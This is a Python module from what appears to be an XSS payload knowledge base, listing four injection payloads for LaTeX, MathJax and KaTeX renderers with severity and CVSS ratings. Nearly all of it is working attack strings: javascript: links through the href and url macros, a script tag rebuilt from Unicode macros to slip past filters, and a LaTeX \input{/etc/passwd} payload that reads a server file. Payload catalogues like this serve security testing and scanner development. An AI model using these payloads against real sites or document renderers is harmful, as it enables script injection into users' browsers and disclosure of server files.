#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2026-01-10 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Scientific and Mathematical Injection Payloads (LaTeX/MathJax)
"""

from ..models import PayloadEntry

MATH_INJECTION_PAYLOADS = {
    "mathjax_href_xss": PayloadEntry(
        payload="$\\href{javascript:alert(1)}{Equation}$",
        contexts=["latex", "mathjax"],
        severity="high",
        cvss_score=7.5,
        description="XSS via MathJax href macro",
        tags=["latex", "mathjax", "href", "xss"],
        reliability="high",
        browser_support=["all"]
    ),
    "katex_html_inclusion": PayloadEntry(
        payload="$\\url{javascript:alert(1)}$",
        contexts=["latex", "katex"],
        severity="medium",
        cvss_score=6.0,
        description="KaTeX URL macro injection (if configured unsafe)",
        tags=["latex", "katex", "url"],
        reliability="low",
        browser_support=["all"]
    ),
    "latex_import_file": PayloadEntry(
        payload="\\input{/etc/passwd}",
        contexts=["latex", "backend"],
        severity="critical",
        cvss_score=9.0,
        description="LaTeX file inclusion (LFI) server-side",
        tags=["latex", "lfi", "server-side"],
        reliability="medium",
        attack_surface="server"
    ),
    "mathjax_unicode_bypass": PayloadEntry(
        payload="$\\unicode{x3c}script\\unicode{x3e}alert(1)\\unicode{x3c}/script\\unicode{x3e}$",
        contexts=["latex", "mathjax"],
        severity="high",
        cvss_score=7.5,
        description="MathJax Unicode macro to reconstruct script tag",
        tags=["latex", "mathjax", "unicode", "bypass"],
        reliability="medium",
        browser_support=["all"]
    )
}

MATH_INJECTION_TOTAL = len(MATH_INJECTION_PAYLOADS)
